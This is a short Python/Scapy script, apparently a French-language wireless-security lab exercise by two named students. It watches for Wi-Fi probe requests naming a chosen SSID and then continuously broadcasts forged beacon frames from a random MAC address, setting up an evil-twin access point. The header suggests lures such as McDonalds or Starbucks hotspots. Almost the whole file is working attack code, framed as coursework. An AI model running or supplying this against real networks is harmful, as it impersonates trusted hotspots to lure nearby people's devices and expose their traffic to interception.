#!/usr/bin/env python
#-*- coding: utf-8 -*-
#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
#  Authors : yimnaing Kamdem && Siu Aurelien
#  Description: Nous allons nous intéresser dans cet exercice à la création 
#               d'un evil twin pour viser une cible que l'on découvre 
#               dynamiquementutilisant des probes.
# 
#  Objectif: Développer un script en Python/Scapy capable de detecter 
#            une STA cherchant un SSID particulier
#               - proposer un evil twin si le SSID est trouvé (i.e. McDonalds, Starbucks, etc.).
#            Pour la détection du SSID, vous devez utiliser Scapy. 
#            Pour proposer un evil twin, vous pouvez récupérer votre code du labo 1
#            ou vous servir d'un outil existant.
#
#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

import argparse
from scapy.all import *

interface = "wlan0mon"

# Nom du point d'accès passé en paramètre au script
ap_SSID = set()

# Arguments
parser = argparse.ArgumentParser(description="script capable de détecter une STA recherchant un SSID particulier")
parser.add_argument("--ssid", required=True, type=str, help="le SSID donné")

arguments = parser.parse_args()

# fonction appelée pour chaque paquet sniffé
def packetHandler(pkt):
    # Test si c'est bien un packet ProbeRequest
    if Dot11ProbeReq in pkt :
        # Test si le SSID correspond à celui qui a été fourni
        if len(pkt.info) > 0  and pkt.info.decode() == ap_SSID:
            # Création du faux point d'accès
            fakeApCreator()
                
 
# Fonction permettant la création d'un faux point d'accès
def fakeApCreator():
    # Création d'une adresse mac aléatoire pour le point d'accès
    mac_AP = str(RandMAC())

    # Création du paquet à envoyer
    fake_AP_packet = RadioTap()/Dot11(type=0,subtype=8,addr1="FF:FF:FF:FF:FF:FF",addr2=mac_AP,addr3=mac_AP)/Dot11Beacon()/Dot11Elt(ID="SSID",info=ap_SSID)

    # Envoi en continu des beacon
    while True:
        sendp(fake_AP_packet, iface=interface)

# Récupération du SSID donné
ap_SSID = arguments.ssid
# On sniffe en passant en fonction de callback la fonction packetHandler
a = sniff(iface=interface, prn=packetHandler)

